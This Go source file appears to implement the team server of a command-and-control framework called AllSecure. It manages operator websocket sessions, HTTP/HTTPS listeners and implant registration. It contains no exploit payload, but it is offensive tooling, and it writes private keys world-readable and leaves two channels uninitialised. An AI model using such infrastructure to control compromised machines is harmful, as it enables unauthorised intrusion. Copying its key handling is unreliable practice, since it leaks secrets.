package Server

import (
	"AllSecure/ListeningServer"
	"AllSecure/TeamServer/Common"
	"AllSecure/TeamServer/Crypt"
	"encoding/json"
	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"log"
	"net/http"
	"os"
	"strconv"
	"strings"
)

type TS struct {
	Server Common.TeamServer
}

var (
	ListeningServers []ListeningServer.LS
)

func (t *TS) ParseConfig(FilePath string) error {

	content, err := os.ReadFile(FilePath + "AllSecure.Config")
	if err != nil {
		log.Fatalln("[error] Error opening file", err)
	}
	err = json.Unmarshal(content, &t.Server.TSConfig)
	log.Println("[info] TeamServer configuration file parsed successfully: ", t.Server.TSConfig)

	return nil
}

func (t *TS) HandleRequest(ClientID string) {
	var NewMessage Common.WebSocketMessage
	value, isok := t.Server.Clients.Load(ClientID)
	if !isok {
		return
	}

	for {
		client := value.(*Common.Client)
		_, message, err := client.Conn.ReadMessage()
		if err != nil {
			log.Println("[error] reading client message", err)
			t.Server.Clients.Delete(ClientID)
			return
		}
		err = json.Unmarshal(message, &NewMessage)
		if err != nil {
			log.Println("[error] attempting to unmarshal websocket message data", err)
			return
		}
		switch NewMessage.MessageType {
		case "ChatMessage":
			t.Server.Clients.Range(func(key, value any) bool {
				client = value.(*Common.Client)
				err = client.Conn.WriteJSON(NewMessage)
				if err != nil {
					log.Println("[error] attempting to write message back to all associated clients", client.ID, err)
					t.Server.Clients.Delete(ClientID)
					return false
				}
				return true
			})
			break
			//CHAT MESSAGE

		case "CreateListener":
			var ListenerData Common.ListenerData
			var TempListener ListeningServer.LS

			err = json.Unmarshal([]byte(NewMessage.Message), &ListenerData)
			if err != nil {
				log.Println("[error] attempting to unmarshal listener data", err)
				return
			}
			go func() {
				err = Common.AddListenerToSQLTable(client.Username, t.Server.TSConfig.DatabasePath, client.UserID, ListenerData)
				if err != nil {
					log.Println("[error] attempting to add listener to database", err)
				}
				return
			}()

			go func() {
				var (
					token string
				)
				TempListener.Listener.Config.Address = ListenerData.HOST
				TempListener.Listener.Config.Port = ListenerData.PortBind
				TempListener.Listener.GinEngine = gin.Default()
				TempListener.Listener.Active = true
				TempListener.Listener.Config.Name = ListenerData.ListenerName
				TempListener.Listener.HttpServer = &http.Server{Addr: ListenerData.HOST + ":" + strconv.Itoa(ListenerData.PortBind), Handler: TempListener.Listener.GinEngine}
				TempListener.Listener.TS.Address = t.Server.TSConfig.Address
				TempListener.Listener.TS.Port = t.Server.TSConfig.Port

				//check if our listener is going to use secure comms.
				if strings.Compare(strings.ToLower(ListenerData.Protocol), strings.ToLower("HTTPS")) == 0 {

					//generate a certificate.
					TempListener.Listener.TLS.Cert, TempListener.Listener.TLS.Key, err = Crypt.HTTPSGenerateRSACertificate(ListenerData.HOST)
					if err != nil {
						log.Fatalln("[error] Failed generating cert / key pair", err)
					}
					//set the path for the cert / key.
					TempListener.Listener.TLS.CertPath = t.Server.TSConfig.ProjectDir + "\\ListeningServer\\Assets\\server_" + ListenerData.ListenerName + ".cert"
					TempListener.Listener.TLS.KeyPath = t.Server.TSConfig.ProjectDir + "\\ListeningServer\\Assets\\server_" + ListenerData.ListenerName + ".key"
					TempListener.Listener.Config.Secure = true

					ListeningServers = append(ListeningServers, TempListener) // add newest listener to our list of listening servers.
					token, err = t.CreateToken(9999, ListenerData.ListenerName+"_"+strconv.Itoa(len(ListeningServers)), false)

					//start server.
					err = TempListener.Start(token)
					if err != nil {
						log.Println("[error] listening server did not start.")
						return
					}
					//use unsecure comms.
				} else if strings.Compare(strings.ToLower(ListenerData.Protocol), strings.ToLower("HTTP")) == 0 {
					TempListener.Listener.Config.Secure = false

					ListeningServers = append(ListeningServers, TempListener) // add newest listener to our list of listening servers.
					token, err = t.CreateToken(9999, ListenerData.ListenerName+"_"+strconv.Itoa(len(ListeningServers)), false)

					err = TempListener.Start(token)
					if err != nil {
						log.Println("[error] listening server did not start.")
						return
					}
				}
			}()
			break //CREATE LISTENER

		case "RemoveListener":
			var ListenerData Common.ListenerData
			err = json.Unmarshal([]byte(NewMessage.Message), &ListenerData)
			if err != nil {
				log.Println("[error] attempting to unmarshal listener data", err)
				return
			}
			go func() {
				ListenerData, err = Common.RemoveListenerFromSQLTable(t.Server.TSConfig.DatabasePath, ListenerData)
				if err != nil {
					log.Println("[error] attempting to add listener to database", err)
				}

				for _, ls := range ListeningServers {
					if ls.Listener.Config.Address == ListenerData.HOST && ls.Listener.Config.Port == ListenerData.PortBind && ls.Listener.Config.Name == ListenerData.ListenerName {
						ls.Stop()
					}
				}
				return
			}()
			break //REMOVE LISTENER

		case "RegisterImplant":
			t.Server.Clients.Range(func(key, value any) bool {
				client = value.(*Common.Client)
				err = client.Conn.WriteJSON(NewMessage)
				if err != nil {
					log.Println("[error] attempting to write message back to all associated clients", client.ID, err)
					t.Server.Clients.Delete(ClientID)
					return false
				}
				return true
			})
			var ImplantData Common.ImplantData
			err = json.Unmarshal([]byte(NewMessage.Message), &ImplantData)
			if err != nil {
				log.Println("[error] attempting to unmarshal implant data", err)
				return
			}
			err = Common.AddImplantToSqlTable(t.Server.TSConfig.DatabasePath, client.UserID, ImplantData) // user id is an int because when you create a new user it's added to the database with a number attached. all user's will have a number therefore you can determine what listener's / implants are started by which user's based on their user id.
			if err != nil {
				log.Println("[error] attempting to add implant to database", err)
				return
			}
			break // REGISTER IMPLANT

		default:
			continue
		} //SWITCH STATEMENT

	} //FOR LOOP

}

// very similar implmenetaiton to https://github.com/HavocFramework/Havoc/blob/main/teamserver/cmd/server/teamserver.go
func (t *TS) Start() {
	var (
		ServerFinished         chan bool
		DefaultEndPointsParsed chan bool
		err                    error
		currdir                string
		//ecdsaPrivKey           *ecdsa.PrivateKey
	)
	//generate random string to sign our JWT's with.
	t.Server.TokenKey, err = Crypt.GenerateRandomString(16)

	//read the configuration file
	currdir, err = os.Getwd()
	if err != nil {
		log.Fatalln("[error] obtaining current directory path")
	}
	parts := strings.Split(currdir, "AllSecure")

	err = t.ParseConfig(parts[0] + "AllSecure\\Config\\")
	if err != nil {
		log.Fatalln("[error] reading the configuration file")
	}

	err = Crypt.GenerateRSAKeys(t.Server.TSConfig.ProjectDir+"\\Config\\", "test_implant")
	if err != nil {
		log.Println("[error] attempting to generate RSA keys", err)
	}

	t.Server.GinEngine = gin.Default()

	//add default endpoints in separate routine.
	go func() {
		result := t.AddDefaultEndPoints()
		DefaultEndPointsParsed <- result
	}()

	//start listeners in database that are already there from last session.
	go func() {
		var list_data []Common.ListenerData

		list_data, err = Common.GetListenerData(t.Server.TSConfig.DatabasePath)

		err = t.StartListenersInDatabase(list_data)
		if err != nil {
			log.Println("[error] attempting to start the listeners in the database.")
		}
	}()

	t.Server.GinEngine.GET("/", func(context *gin.Context) {
		context.Redirect(http.StatusMovedPermanently, "home/")
	})

	t.Server.GinEngine.Static("/home", t.Server.TSConfig.ProjectDir+"\\TeamServer\\Assets\\Index")

	t.Server.GinEngine.POST("/:endpoint", func(ctx *gin.Context) {
		var endpoint = ctx.Request.RequestURI[1:]
		if len(t.Server.Endpoints) > 0 {
			for i := range t.Server.Endpoints {
				if t.Server.Endpoints[i].Endpoint == endpoint {
					t.Server.Endpoints[i].Function(ctx)
				}
			}
		}
	})

	t.Server.GinEngine.GET("/ws", func(ctx *gin.Context) {
		var (
			upgrader  websocket.Upgrader
			WebSocket *websocket.Conn
			ClientID  string
			token     string
			claims    *Common.JWTClaims
		)
		ClientID, err = Crypt.GenerateRandomString(8)

		if err != nil {
			log.Fatalln("[error] could not generate random string when starting team server")
		}

		currdir, err = os.Getwd()
		if err != nil {
			log.Fatalln("[error] could not get the current directory")
		}

		if WebSocket, err = upgrader.Upgrade(ctx.Writer, ctx.Request, nil); err != nil {
			ctx.JSON(http.StatusBadRequest, gin.H{"error": "Failed to set up Websocket"})
			return
		}
		token = ctx.GetHeader("Authorization")
		if token == "" {
			ctx.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid Parameters"})
			return
		}

		claims, err = t.ParseToken(token)
		if err != nil {
			ctx.JSON(http.StatusUnauthorized, gin.H{"error": "Invalid Parameters"})
			return
		}

		t.Server.Clients.Store(ClientID, &Common.Client{
			Conn:          WebSocket,
			Username:      claims.Username,
			UserID:        claims.UserID,
			RemoteIP:      WebSocket.RemoteAddr().String(),
			Authenticated: false,
			Administrator: claims.Administrator,
		})

		go t.HandleRequest(ClientID)
	})

	go func(Host, Port string) {
		var (
			CertPath = t.Server.TSConfig.ProjectDir + "\\TeamServer" + "\\Assets\\server.cert"
			KeyPath  = t.Server.TSConfig.ProjectDir + "\\TeamServer" + "\\Assets\\server.key"
			Cert     []byte
			Key      []byte
		)

		t.Server.TLS.CertPath = CertPath
		t.Server.TLS.KeyPath = KeyPath

		Cert, Key, err = Crypt.HTTPSGenerateRSACertificate(Host)
		if err != nil {
			log.Fatalln("[error] Failed generating cert / key pair", err)
		}

		err = os.WriteFile(t.Server.TLS.CertPath, Cert, 0644)
		if err != nil {
			log.Fatalln("[error] Failed to save certificate", err)
		}
		err = os.WriteFile(t.Server.TLS.KeyPath, Key, 0644)
		if err != nil {
			log.Fatalln("[error] Failed to save key path", err)
		}

		if err := t.Server.GinEngine.RunTLS(Host+":"+Port, t.Server.TLS.CertPath, t.Server.TLS.KeyPath); err != nil {
			log.Fatalln("[error] failed to start websocket: ", err)
		}

		ServerFinished <- true

		os.Exit(0)

	}(t.Server.TSConfig.Address, t.Server.TSConfig.Port)

	DefaultsAdded := <-DefaultEndPointsParsed
	if DefaultsAdded == false {
		log.Fatalln("[error] attempting to add default endpoints")
	}

	//should wait until we receive on this channel to close server.
	<-ServerFinished

}

func (t *TS) AddEndPoint(endpoint *Common.Endpoint) bool {
	for _, EP := range t.Server.Endpoints {
		if EP.Endpoint == endpoint.Endpoint {
			return false
		}
	}
	t.Server.Endpoints = append(t.Server.Endpoints, endpoint)

	return true
}

func (t *TS) RemoveEndPoint(endpoint string) bool {
	for i := range t.Server.Endpoints {
		if t.Server.Endpoints[i].Endpoint == endpoint {
			t.Server.Endpoints = append(t.Server.Endpoints[:i], t.Server.Endpoints[i+1:]...)
			return false
		}
	}

	return true
}
